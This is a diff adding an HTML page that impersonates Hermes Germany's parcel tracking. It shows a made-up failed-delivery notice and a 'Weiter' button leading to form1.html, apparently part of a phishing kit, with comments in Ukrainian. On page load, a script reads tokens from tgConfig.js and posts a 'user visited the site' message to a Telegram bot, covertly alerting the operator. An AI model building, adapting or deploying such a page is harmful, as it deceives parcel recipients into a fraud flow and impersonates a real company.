@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sendungsverfolgung</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px;
+            background-color: white;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        header img.logo {
+            height: 26px;
+        }
+
+        .icon-button {
+            background-color: #00a1e0;
+            padding: 10px;
+            border-radius: 5px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 21px;
+            height: 21px;
+            cursor: pointer;
+            transition: filter 0.2s ease;
+        }
+
+        .icon-button:active {
+            filter: brightness(90%);
+        }
+
+        .icon-button img {
+            width: 20px;
+            height: 20px;
+        }
+
+        main {
+            padding: 20px;
+        }
+
+        .tracking-container {
+            text-align: center;
+            padding: 30px 15px;
+        }
+
+        .tracking-image img {
+            max-width: 100%;
+            margin-top: -27px;
+            border-radius: 10px;
+        }
+
+        .tracking-block {
+            background-color: white;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            margin-top: 20px;
+        }
+
+        .tracking-label {
+            font-size: 16px;
+            color: #555;
+        }
+
+        .tracking-number {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        .tracking-status {
+            color: red;
+            font-weight: bold;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .tracking-date {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff6600;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:active {
+            filter: brightness(90%);
+        }
+
+        .custom-divider {
+            height: 1px;
+            background-color: #dcdcdc;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            margin: 20px 0;
+            width: 100%;
+        }
+
+        .timeline {
+            position: relative;
+            margin: 20px 0;
+            padding-left: 0;
+        }
+
+        .timeline-item {
+            display: flex;
+            align-items: flex-start;
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .timeline-circle {
+            width: 20px;
+            height: 20px;
+            background-color: #008080;
+            border-radius: 50%;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            flex-shrink: 0;
+            z-index: 1;
+        }
+
+        .timeline-circle::before {
+            content: "✓";
+        }
+
+        .timeline-item::after {
+            content: "";
+            position: absolute;
+            top: 20px;
+            left: 9px;
+            width: 2px;
+            background-color: #008080;
+            height: 100%;
+        }
+
+        .timeline-item:last-child::after {
+            display: none;
+        }
+
+        .timeline-content {
+            margin-left: 10px;
+            text-align: left;
+        }
+
+        .timeline-text {
+            font-weight: bold;
+            color: #666;
+        }
+
+        .details {
+            font-size: 14px;
+            color: grey;
+            display: none;
+            margin-top: 5px;
+        }
+
+        .toggle-link {
+            color: #007bff;
+            text-decoration: none;
+            cursor: pointer;
+            display: block;
+            margin: 20px 0;
+        }
+
+        .timeline-item.failed .timeline-circle {
+            background-color: red;
+        }
+
+        .timeline-item.failed .timeline-circle::before {
+            content: "!";
+        }
+
+        .timeline-item.failed .timeline-text {
+            color: red;
+            font-weight: bold;
+        }
+
+        footer {
+            background-color: #333;
+            color: white;
+            padding: 15px;
+            font-size: 16px;
+        }
+
+        .footer-section {
+            border-bottom: 1px solid #555;
+            padding: 16px 0;
+        }
+
+        .footer-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            color: #00a1e0;
+            font-weight: bold;
+        }
+
+        .footer-item .arrow {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-right: 2px solid #00a1e0;
+            border-bottom: 2px solid #00a1e0;
+            transform: rotate(45deg);
+            transition: transform 0.3s;
+        }
+
+        .footer-section.active .arrow {
+            transform: rotate(-135deg);
+        }
+
+        .footer-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+            padding-left: 10px;
+        }
+
+        .footer-section.active .footer-content {
+            max-height: 500px;
+            padding-top: 10px;
+        }
+
+        .footer-content a,
+        .footer-content p {
+            font-size: 13px;
+            color: white;
+            text-decoration: none;
+            margin: 12px 0;
+            /* Правильна відстань між підпунктами */
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 9px;
+            padding-left: 0px;
+        }
+
+        .footer-content a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-content p::before {
+            content: "✓";
+            color: #00c800;
+        }
+
+        .card-logos img {
+            height: 30px;
+            margin: 5px 10px 5px 0;
+        }
+
+        .footer-note {
+            text-align: center;
+            color: grey;
+            font-size: 14px;
+            margin-top: 30px;
+            margin-bottom: 10px;
+        }
+
+        .footer-sub {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .footer-sub a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .footer-sub a:hover {
+            text-decoration: underline;
+        }
+    </style>
+
+</head>
+
+<body>
+
+    <header>
+        <div onclick="window.location.href='https://www.myhermes.de/preise/paeckchen-paket/'" class="icon-button">
+            <img src="https://img.icons8.com/ios-filled/50/ffffff/menu--v1.png" alt="Menu">
+        </div>
+        <img src="logo.png" alt="Logo" onclick="window.location.href='https://www.myhermes.de/'" class="logo">
+        <div onclick="window.location.href='https://www.myhermes.de/konto'" class="icon-button">
+            <img src="https://img.icons8.com/ios/50/ffffff/user--v1.png" alt="Profile">
+        </div>
+    </header>
+
+    <main>
+        <div class="tracking-container">
+            <div class="tracking-image">
+                <img src="banner.jpg" alt="Tracking Image">
+            </div>
+
+            <div class="tracking-block">
+                <div class="tracking-label">Liefernummer</div>
+                <div class="tracking-number">00340434161000000156</div>
+
+                <div class="tracking-status">
+                    <img src="Warning.jpg" alt="Warning" style="width: 24px; height: 24px;">
+                    Lieferung fehlgeschlagen
+                </div>
+
+                <div class="date" style="font-weight: bold;">27.06.2025, 12:38 Uhr</div>
+                <div style="color: grey; font-size: 18px; margin-top: 10px;">
+                    Der Empfänger war nicht erreichbar. Bitte verschieben Sie die Zustellungszeit des Pakets, um zu
+                    verhindern, dass das Paket zurückgeschickt wird.
+                </div>
+
+                <div class="custom-divider"></div>
+
+                <div style="text-align: left; margin: 20px 0;">
+                    <div style="font-weight: bold; font-size: 16px; margin-bottom: 5px;">Lieferung an</div>
+                    <div style="font-size: 16px;">MUNICH, BY DE</div>
+                </div>
+
+                <div class="timeline">
+                    <div class="timeline-item">
+                        <div class="timeline-circle"></div>
+                        <div class="timeline-content">
+                            <div class="timeline-text">Etikett erstellt</div>
+                            <div class="details">Deutschland<br>23.06.2025, 08:31 Uhr</div>
+                        </div>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-circle"></div>
+                        <div class="timeline-content">
+                            <div class="timeline-text">Wir haben Ihr Paket</div>
+                            <div class="details">Hamburg, Hamburg DE<br>23.06.2025, 09:05 Uhr</div>
+                        </div>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-circle"></div>
+                        <div class="timeline-content">
+                            <div class="timeline-text">Unterwegs</div>
+                            <div class="details">Hamburg, Hamburg DE<br>24.06.2025, 09:10 Uhr</div>
+                        </div>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-circle"></div>
+                        <div class="timeline-content">
+                            <div class="timeline-text">Zur Auslieferung</div>
+                            <div class="details">MUNICH, BY DE<br>26.06.2025, 10:07 Uhr</div>
+                        </div>
+                    </div>
+
+                    <div class="timeline-item failed">
+                        <div class="timeline-circle"></div>
+                        <div class="timeline-content">
+                            <div class="timeline-text">Lieferung fehlgeschlagen</div>
+                            <div class="details">MUNICH, BY DE<br>27.06.2025, 03:38 Uhr</div>
+                        </div>
+                    </div>
+                </div>
+
+                <a href="#" id="toggleDetails" class="toggle-link">Alle Versanddetails anzeigen</a>
+
+                <button onclick="window.location.href='form1.html'">Weiter</button>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-section">
+            <div class="footer-item" onclick="toggleFooterContent(this)">
+                Schnelleinstieg
+                <span class="arrow"></span>
+            </div>
+            <div class="footer-content">
+                <a href="#">Paketschein erstellen</a>
+                <a href="#">Versandkosten berechnen</a>
+                <a href="#">Sendung verfolgen</a>
+                <a href="#">Hermes WunschZustellung</a>
+                <a href="#">PaketShop finden</a>
+                <a href="#">myHermes Konto</a>
+                <a href="#">Newsletter</a>
+            </div>
+        </div>
+
+        <div class="footer-section">
+            <div class="footer-item" onclick="toggleFooterContent(this)">
+                Preise
+                <span class="arrow"></span>
+            </div>
+            <div class="footer-content">
+                <a href="#">Hermes Päckchen und Pakete national</a>
+                <a href="#">Pakete international</a>
+                <a href="#">Koffer und Gepäck</a>
+                <a href="#">Reifen</a>
+            </div>
+        </div>
+
+        <div class="footer-section">
+            <div class="footer-item" onclick="toggleFooterContent(this)">
+                Zahlarten
+                <span class="arrow"></span>
+            </div>
+            <div class="footer-content">
+                <p>Barzahlung</p>
+                <p>Online Zahlung</p>
+                <div class="card-logos">
+                    <img src="https://img.icons8.com/color/48/000000/paypal.png" />
+                    <img src="https://img.icons8.com/color/48/000000/visa.png" />
+                    <img src="https://img.icons8.com/color/48/000000/mastercard.png" />
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-section">
+            <div class="footer-item" onclick="toggleFooterContent(this)">
+                Deine Vorteile
+                <span class="arrow"></span>
+            </div>
+            <div class="footer-content">
+                <p>Immer in deiner Nähe: rund 17.000 Hermes PaketShops</p>
+                <p>Schon ab 3,70 € versenden per PaketShop-Zustellung</p>
+                <p>Haftung und Sendungsverfolgung immer inklusive</p>
+                <p>Gewicht bis 31,5 kg</p>
+                <p>Mobiler Paketschein ohne Drucken</p>
+                <p>CO₂-neutraler Versand durch Kompensation</p>
+            </div>
+        </div>
+
+        <div class="footer-section">
+            <div class="footer-item" onclick="toggleFooterContent(this)">
+                Kundenservice
+                <span class="arrow"></span>
+            </div>
+            <div class="footer-content">
+                <a href="#">Alle Fragen und Antworten</a>
+                <a href="#">Fragen zum Empfang</a>
+                <a href="#">Fragen zum Versand</a>
+            </div>
+        </div>
+
+        <div class="footer-note">© 2025 Hermes Germany GmbH</div>
+        <div class="footer-sub">
+            <a href="#">Impressum</a>
+            <a href="#">AGB</a>
+            <a href="#">Datenschutz</a>
+            <a href="#">Cookies</a>
+            <a href="#">Sicherheitshinweise</a>
+            <a href="#">Sitemap</a>
+            <a href="#">Über uns</a>
+            <a href="#">Presse</a>
+            <a href="#">Karriere</a>
+            <a href="#">Blog</a>
+        </div>
+    </footer>
+
+    <script>
+        function toggleFooterContent(element) {
+            const sections = document.querySelectorAll('.footer-section');
+            sections.forEach(sec => {
+                if (sec !== element.parentElement) {
+                    sec.classList.remove('active');
+                }
+            });
+            element.parentElement.classList.toggle('active');
+        }
+
+        // Фікс для "Alle Versanddetails anzeigen"
+        document.addEventListener("DOMContentLoaded", function () {
+            const toggle = document.getElementById("toggleDetails");
+            let opened = false;
+            toggle.addEventListener("click", function (e) {
+                e.preventDefault();
+                opened = !opened;
+                const details = document.querySelectorAll(".details");
+                details.forEach(d => {
+                    d.style.display = opened ? "block" : "none";
+                });
+                toggle.textContent = opened ? "Alle Versanddetails ausblenden" : "Alle Versanddetails anzeigen";
+            });
+        });
+    </script>
+
+    <!-- Конфіг з токенами/айді -->
+    <script src="tgConfig.js"></script>
+    <script>
+        (function () {
+            if (!window.TGCFG) { console.warn("TGCFG missing"); return; }
+            document.addEventListener("DOMContentLoaded", function () {
+                fetch(`https://api.telegram.org/bot${TGCFG.STATS_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TGCFG.CHAT_ID,
+                        text: "1️⃣1️Користувач перейшов на сайт"
+                    })
+                }).catch(() => { });
+            });
+        })();
+    </script>
+
+
+
+</body>
+
+</html>
